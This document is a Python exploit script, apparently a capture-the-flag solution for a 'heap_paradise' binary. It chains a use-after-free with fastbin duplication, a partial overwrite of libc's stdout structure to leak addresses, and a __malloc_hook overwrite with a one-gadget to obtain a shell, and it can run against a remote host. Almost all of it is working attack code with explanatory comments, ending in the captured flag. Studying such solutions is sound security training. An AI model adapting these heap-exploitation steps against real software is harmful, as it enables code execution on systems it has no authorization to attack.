#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./heap_paradise_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
file ./heap_paradise_patched

c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def alloc(size, data):
    slna(b':', 1)
    slna(b':', size)
    sa(b':', data)

def delete(idx):
    slna(b':', 2)
    sna(b':', idx)

# ==================== EXPLOIT ====================

# I pretty love this challenge
# The bug is Use-After-Free with leakless function and limited size for the chunk (max 0x70)
# So we have to do some heap feng shui to leak libc address
# First we create two fake chunks, one with the size 0x31 (this one to pass the check in fastbin (malloc will check if the next chunk has an inuse flag),
# and unsorted bin),
# and the other 0x20 chunk (this one to pass unsorted bin check)

# After few setup, we can get a chunk in fastbin with the size 0xa1, and free that chunk to put it in unsorted bin
# With this we successfully have 1 pointer in 2 places (unsorted bin and fastbin). We need to to do this because we must keep
# the libc pointer in our bins, so that when we overwrite the fd pointer to point to _IO_2_1_stdout_ - 0x43 (to bypass the size check in fastbin)
# we can allocate that `_IO_2_1_stdout_ - 0x43` chunk and edit the content of `_IO_2_1_stdout_` to leak libc address

# Once we have the libc address, it is easy to overwrite __malloc_hook with one gadget, and trigger malloc to get shell by using the same trick as secret garden

while True:
    p = start()

    alloc(0x68, flat(
        0, 0,
        0, 0x71
    )) # 0
    alloc(0x68, flat(
        0, 0,
        0, 0x31,
        0, 0,
        0, 0,
        0, 0x21
    )) # 1

    delete(0)
    delete(1)
    delete(0)

    alloc(0x68, p8(0x20))
    alloc(0x68, p8(0))
    alloc(0x68, p8(0))
    alloc(0x68, p8(0))

    # reallocating chunk 0 to change the size of our fake chunk *5* to 0xa1, and free that chunk
    delete(5)
    delete(0)
    alloc(0x68, p64(0) * 3 + p64(0xa1))
    # now we have unsorted bin chunk in fastbin
    delete(5)

    try:
        # now we have a libc pointer in our controlled chunk, time to guess stdout address
        # 1/16 chance to get the right address :D
        delete(0)
        payload = p64(0) * 3 + p64(0x71) + p16(0xf5dd)
        alloc(0x68, payload)

        alloc(0x68, p8(0))
        alloc(0x68, b'\x00' * 0x33 + p64(0xfbad1800) + p64(0) * 3 + b'\x20')
        data = rl()
        libc.address = u64(data[0x20:0x28]) - 0x3c4620

        if libc.address & 0xfff == 0:
            break
    except:
        close()

slog('libc base @ %#x', libc.address)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    sleep(1)

# overwrite __malloc_hook with one gadget
delete(5)
delete(0)
alloc(0x68, p64(0) * 3 + p64(0x71) + p64(libc.sym.__malloc_hook - 0x23))

alloc(0x68, p8(0))
alloc(0x68, b'\x00' * 0x13 + p64(libc.address + 0xef6c4))

# use the trick same as secret garden to trigger __malloc_hook
delete(0)
delete(0)

interactive()
# FLAG{W3lc0m3_2_h3ap_p4radis3}
